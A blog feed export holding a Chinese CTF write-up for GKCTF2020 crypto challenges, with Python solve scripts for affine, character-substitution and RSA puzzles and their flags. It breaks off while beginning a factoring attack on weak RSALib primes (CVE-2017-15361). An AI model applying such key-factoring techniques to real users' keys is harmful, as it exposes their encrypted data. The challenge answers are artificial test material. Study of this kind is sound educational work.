{
    "version": "https://jsonfeed.org/version/1",
    "title": "",
    "subtitle": "",
    "icon": "https://blog.xcu.icu/images/favicon.ico",
    "description": "一个妄想全栈web小废物",
    "home_page_url": "https://blog.xcu.icu",
    "items": [
        {
            "id": "https://blog.xcu.icu/2023/04/05/GKCTF2020/",
            "url": "https://blog.xcu.icu/2023/04/05/GKCTF2020/",
            "title": "GKCTF2020WP",
            "date_published": "2023-04-04T16:00:00.000Z",
            "content_html": "<h2 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h2>\n<p>通过 buuctf 平台复现一些之前的赛题</p>\n<h2 id=\"crypto\"><a class=\"anchor\" href=\"#crypto\">#</a> Crypto</h2>\n<h3 id=\"小学生的密码题\"><a class=\"anchor\" href=\"#小学生的密码题\">#</a> 小学生的密码题</h3>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304031046078.png\" alt=\"image-20230403104605972\" /></p>\n<p>题目描述就这么多，简单的仿射加密</p>\n<figure class=\"highlight perl\"><figcaption data-lang=\"perl\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>c<span class=\"token operator\">=</span>Ea<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">(</span><span class=\"token regex\">m)=am+b (mod 26)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token regex\">m=Da,b(c)=a</span>−<span class=\"token number\">1</span><span class=\"token punctuation\">(</span>c−b<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>mod <span class=\"token number\">26</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>根据题目描述，可得 a=11，b=6</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> base64</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> gmpy2 <span class=\"token keyword\">import</span> invert</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token string\">'welcylk'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>a<span class=\"token operator\">=</span><span class=\"token number\">11</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>b<span class=\"token operator\">=</span><span class=\"token number\">6</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>c<span class=\"token operator\">=</span><span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>k<span class=\"token operator\">=</span><span class=\"token number\">26</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    c <span class=\"token operator\">+=</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>invert<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>k<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">97</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">26</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">97</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token operator\">//</span>sorcery</pre></td></tr></table></figure><h3 id=\"汉字的秘密\"><a class=\"anchor\" href=\"#汉字的秘密\">#</a> 汉字的秘密</h3>\n<figure class=\"highlight perl\"><figcaption data-lang=\"perl\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>王壮 夫工 王中 王夫 由由井 井人 夫中 夫夫 井王 土土 夫由 土夫 井中 士夫 王工 王人 土由 由口夫</pre></td></tr></table></figure><p>当铺加密，很奇怪，当前汉字有多少笔画出头，就是转化成数字几，一一对应的</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>hz <span class=\"token operator\">=</span> <span class=\"token string\">\"田口由中人工大土士王夫井羊壮\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>sz <span class=\"token operator\">=</span> <span class=\"token string\">\"00123455567899\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token string\">\"王壮 夫工 王中 王夫 由由井 井人 夫中 夫夫 井王 土土 夫由 土夫 井中 士夫 王工 王人 土由 由口夫\"</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>s <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> m<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">if</span> i <span class=\"token keyword\">in</span> hz<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        s <span class=\"token operator\">+=</span> sz<span class=\"token punctuation\">[</span>hz<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        s <span class=\"token operator\">+=</span> <span class=\"token string\">' '</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># print(s)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>ll <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>ll<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>s <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>ll<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    s <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>ll<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">#['69', '74', '62', '67', '118', '83', '72', '77', '86', '55', '71', '57', '82', '57', '64', '63', '51', '107']</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\">#EJ>CvSHMV7G9R9@?3k</span></pre></td></tr></table></figure><p>这里转化后，发现转为字符后不规律，这里即将前几个字符对应 flag 转换，是一个变异凯撒</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>hz <span class=\"token operator\">=</span> <span class=\"token string\">\"田口由中人工大土士王夫井羊壮\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>sz <span class=\"token operator\">=</span> <span class=\"token string\">\"00123455567899\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token string\">\"王壮 夫工 王中 王夫 由由井 井人 夫中 夫夫 井王 土土 夫由 土夫 井中 士夫 王工 王人 土由 由口夫\"</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>s <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> m<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">if</span> i <span class=\"token keyword\">in</span> hz<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        s <span class=\"token operator\">+=</span> sz<span class=\"token punctuation\">[</span>hz<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        s <span class=\"token operator\">+=</span> <span class=\"token string\">' '</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># print(s)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>ll <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>ll<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>s <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>ll<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    s <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>ll<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>i<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">.</span>lower<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">#['69', '74', '62', '67', '118', '83', '72', '77', '86', '55', '71', '57', '82', '57', '64', '63', '51', '107']</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\">#flag&#123;you_are_good&#125;</span></pre></td></tr></table></figure><h3 id=\"babycrypto\"><a class=\"anchor\" href=\"#babycrypto\">#</a> babycrypto</h3>\n<figure class=\"highlight perl\"><figcaption data-lang=\"perl\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># n:0xb119849bc4523e49c6c038a509a74cda628d4ca0e4d0f28e677d57f3c3c7d0d876ef07d7581fe05a060546fedd7d061d3bc70d679b6c5dd9bc66c5bdad8f2ef898b1e785496c4989daf716a1c89d5c174da494eee7061bcb6d52cafa337fc2a7bba42c918bbd3104dff62ecc9d3704a455a6ce282de0d8129e26c840734ffd302bec5f0a66e0e6d00b5c50fa57c546cff9d7e6a978db77997082b4cb927df9847dfffef55138cb946c62c9f09b968033745b5b6868338c64819a8e92a827265f9abd409359a9471d8c3a2631b80e5b462ba42336717700998ff38536c2436e24ac19228cd2d7a909ead1a8494ff6c3a7151e888e115b68cc6a7a8c6cf8a6c005L</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># e:65537</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># enc:1422566584480199878714663051468143513667934216213366733442059106529451931078271460363335887054199577950679102659270179475911101747625120544429262334214483688332111552004535828182425152965223599160129610990036911146029170033592055768983427904835395850414634659565092191460875900237711597421272312032796440948509724492027247376113218678183443222364531669985128032971256792532015051829041230203814090194611041172775368357197854451201260927117792277559690205342515437625417792867692280849139537687763919269337822899746924269847694138899165820004160319118749298031065800530869562704671435709578921901495688124042302500361</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># p>>128&lt;&lt;128:0xe4e4b390c1d201dae2c00a4669c0865cc5767bc444f5d310f3cfc75872d96feb89e556972c99ae20753e3314240a52df5dccd076a47c6b5d11b531b92d901b2b512aeb0b263bbfd624fe3d52e5e238beeb581ebe012b2f176a4ffd1e0d2aa8c4d3a2656573b727d4d3136513a931428b00000000000000000000000000000000L</span></pre></td></tr></table></figure><p>拿到题后就是上面的内容，看起来是 RSA，20 年的题了现在可以直接分解出来这个 n，直接常规接 RSA 即可</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> gmpy2 <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> libnum</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">22356763374676421464625378500213339933332772809897207920729779273423674391734609826525432054721219700275907299132471518921609327317193522567659631757746842030241874692914098354564311806192080734895649520789778880115460999713973202684541940857690744940359412410680906226760273075221532248260114209496048785258860756023841150910290983974843412361701517438220974722832625030127395031631696995777436058406987465592189873785392136925593708921923255186282515777996509326779993612528103615281644689464568237409082282767318227236298791238683706176542426759149262625349498709445342710799386836175120162674849965878446213480453</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token number\">139091353059018128421744751525080056530307965918298875691299992775484064426591581456998968315582349027071987206340653988925923465225471661893944397744293391269274124345189028818977002600599732469824164218366399726233373069742839737062004061244787413638290767590029376062508897417109117189614458570241407458359</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>q <span class=\"token operator\">=</span> <span class=\"token number\">160734387026849747944319274262095716650717626398118440194223452208652532694713113062084219512359968722796763029072117463281356654614167941930993838521563406258263299846297499190884495560744873319814150988520868951045961906000066805136724505347218275230562125457122462589771119429631727404626489634314291445667</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">1422566584480199878714663051468143513667934216213366733442059106529451931078271460363335887054199577950679102659270179475911101747625120544429262334214483688332111552004535828182425152965223599160129610990036911146029170033592055768983427904835395850414634659565092191460875900237711597421272312032796440948509724492027247376113218678183443222364531669985128032971256792532015051829041230203814090194611041172775368357197854451201260927117792277559690205342515437625417792867692280849139537687763919269337822899746924269847694138899165820004160319118749298031065800530869562704671435709578921901495688124042302500361</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>N <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>d <span class=\"token operator\">=</span> invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>N<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>libnum<span class=\"token punctuation\">.</span>n2s<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token operator\">//</span><span class=\"token string\">b'flag&#123;3d0914a1-1e97-4822-a745-c7e20c5179b9&#125;'</span></pre></td></tr></table></figure><h3 id=\"backdoor\"><a class=\"anchor\" href=\"#backdoor\">#</a> Backdoor</h3>\n<p>这个题下载后给了三个文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041526867.png\" alt=\"image-20230404152640752\" /></p>\n<p>题目名叫后门，给了一个公式<strong>弱素数生成公式</strong></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304041527502.png\" alt=\"image-20230404152753424\" /></p>\n<p>flag.enc</p>\n<figure class=\"highlight perl\"><figcaption data-lang=\"perl\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>MDIxNDJhZjdjZTcwZmUwZGRhZTExNmJiN2U5NjI2MDI3NGVlOTI1MmE4Y2I1MjhlN2ZkZDI5ODA5YzJhNjAzMjcyN2MwNTUyNjEzM2FlNDYxMGVkOTQ0NTcyZmYxYWJmY2QwYjE3YWEyMmVmNDRhMg<span class=\"token operator\">==</span></pre></td></tr></table></figure><p>这个值解 base64 之后转 10 进制</p>\n<figure class=\"highlight perl\"><figcaption data-lang=\"perl\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">59021026099361835300364130419492050160728561849475961557849334226894382166900594987062873888829896738392942368210302613981217873768</span></pre></td></tr></table></figure><p>pub.pem</p>\n<figure class=\"highlight perl\"><figcaption data-lang=\"perl\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">-</span>BEGIN PUBLIC KEY<span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>MFMwDQYJKoZIhvcNAQEBBQADQgAwPwI4BXdHlrMB4cf0C0lFBWiLH94h9tX<span class=\"token operator\">/</span>zmNv</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>8WfYXjfXp7dJPjPBfUQXolyiSmcWMUzxhuFpltz8Z5sCAwEAAQ<span class=\"token operator\">==</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">-</span>END PUBLIC KEY<span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">-</span></pre></td></tr></table></figure><p><span class=\"exturl\" data-url=\"aHR0cDovL3Rhc2sucHk=\">task.py</span></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>PublicKey <span class=\"token keyword\">import</span> RSA</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2<span class=\"token punctuation\">,</span> binascii</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> base64</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">from</span> FLAG <span class=\"token keyword\">import</span> flag</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">rsa_encrypt</span><span class=\"token punctuation\">(</span>message<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'./pub.pem'</span> <span class=\"token punctuation\">,</span><span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        key <span class=\"token operator\">=</span> RSA<span class=\"token punctuation\">.</span>import_key<span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    e <span class=\"token operator\">=</span> key<span class=\"token punctuation\">.</span>e</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    n <span class=\"token operator\">=</span> key<span class=\"token punctuation\">.</span>n</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    c <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre> </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    ciphertext <span class=\"token operator\">=</span> binascii<span class=\"token punctuation\">.</span>hexlify<span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">return</span> ciphertext</pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    text <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span>rsa_encrypt<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'flag.enc'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'wb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>text<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>google 后发现是 CVE-2017-15361，<span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL2FzZWN1cml0eXNpdGUtd2hlbi1ib2ItbWV0LWFsaWNlL3NvLXdoYXQtd2FzLXRoZS1wcm9ibGVtLXdpdGgtdGhlLWVzdG9uaWFuLWlkLXN5c3RlbS1hbmQtdHBtcy0xZWYwMmE5YmRlN2Y=\">那么爱沙尼亚身份证系统和 TPM 的问题是什么？弱素数生成器（和 RSA！ | 作者：比尔・布坎南教授 OBE |A 安全网站：当鲍勃遇见爱丽丝 | 中等 (medium.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hc2VjdXJpdHlzaXRlLmNvbS9lbmNyeXB0aW9uL2NvcHBlcg==\">弱素数生成器 （RSALib） (asecuritysite.com)</span></p>\n<p>其中 <em>k</em> 和 <em>a</em> 是破解时的未知整数。<em>M</em> 是前 n 个素数的乘法。</p>\n<p>n 的素数因子 p 是由这个公式得出的</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util <span class=\"token keyword\">import</span> number</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>k<span class=\"token operator\">=</span><span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>vals<span class=\"token operator\">=</span><span class=\"token number\">39</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>a<span class=\"token operator\">=</span><span class=\"token number\">12</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>M<span class=\"token operator\">=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>primes <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">11</span><span class=\"token punctuation\">,</span> <span class=\"token number\">13</span><span class=\"token punctuation\">,</span> <span class=\"token number\">17</span><span class=\"token punctuation\">,</span> <span class=\"token number\">19</span><span class=\"token punctuation\">,</span> <span class=\"token number\">23</span><span class=\"token punctuation\">,</span> <span class=\"token number\">29</span><span class=\"token punctuation\">,</span> <span class=\"token number\">31</span><span class=\"token punctuation\">,</span> <span class=\"token number\">37</span><span class=\"token punctuation\">,</span> <span class=\"token number\">41</span><span class=\"token punctuation\">,</span> <span class=\"token number\">43</span><span class=\"token punctuation\">,</span> <span class=\"token number\">47</span><span class=\"token punctuation\">,</span> <span class=\"token number\">53</span><span class=\"token punctuation\">,</span> <span class=\"token number\">59</span><span class=\"token punctuation\">,</span> <span class=\"token number\">61</span><span class=\"token punctuation\">,</span> <span class=\"token number\">67</span><span class=\"token punctuation\">,</span> <span class=\"token number\">71</span><span class=\"token punctuation\">,</span> <span class=\"token number\">73</span><span class=\"token punctuation\">,</span> <span class=\"token number\">79</span><span class=\"token punctuation\">,</span> <span class=\"token number\">83</span><span class=\"token punctuation\">,</span> <span class=\"token number\">89</span><span class=\"token punctuation\">,</span> <span class=\"token number\">97</span><span class=\"token punctuation\">,</span> <span class=\"token number\">101</span><span class=\"token punctuation\">,</span> <span class=\"token number\">103</span><span class=\"token punctuation\">,</span> <span class=\"token number\">107</span><span class=\"token punctuation\">,</span> <span class=\"token number\">109</span><span class=\"token punctuation\">,</span> <span class=\"token number\">113</span><span class=\"token punctuation\">,</span> <span class=\"token number\">127</span><span class=\"token punctuation\">,</span> <span class=\"token number\">131</span><span class=\"token punctuation\">,</span> <span class=\"token number\">137</span><span class=\"token punctuation\">,</span> <span class=\"token number\">139</span><span class=\"token punctuation\">,</span> <span class=\"token number\">149</span><span class=\"token punctuation\">,</span> <span class=\"token number\">151</span><span class=\"token punctuation\">,</span> <span class=\"token number\">157</span><span class=\"token punctuation\">,</span> <span class=\"token number\">163</span><span class=\"token punctuation\">,</span> <span class=\"token number\">167</span><span class=\"token punctuation\">,</span> <span class=\"token number\">173</span><span class=\"token punctuation\">,</span> <span class=\"token number\">179</span><span class=\"token punctuation\">,</span> <span class=\"token number\">181</span><span class=\"token punctuation\">,</span> <span class=\"token number\">191</span><span class=\"token punctuation\">,</span> <span class=\"token number\">193</span><span class=\"token punctuation\">,</span> <span class=\"token number\">197</span><span class=\"token punctuation\">,</span> <span class=\"token number\">199</span><span class=\"token punctuation\">,</span> <span class=\"token number\">211</span><span class=\"token punctuation\">,</span> <span class=\"token number\">223</span><span class=\"token punctuation\">,</span> <span class=\"token number\">227</span><span class=\"token punctuation\">,</span> <span class=\"token number\">229</span><span class=\"token punctuation\">,</span> <span class=\"token number\">233</span><span class=\"token punctuation\">,</span> <span class=\"token number\">239</span><span class=\"token punctuation\">,</span> <span class=\"token number\">241</span><span class=\"token punctuation\">,</span> <span class=\"token number\">251</span><span class=\"token punctuation\">,</span> <span class=\"token number\">257</span><span class=\"token punctuation\">,</span> <span class=\"token number\">263</span><span class=\"token punctuation\">,</span> <span class=\"token number\">269</span><span class=\"token punctuation\">,</span> <span class=\"token number\">271</span><span class=\"token punctuation\">,</span> <span 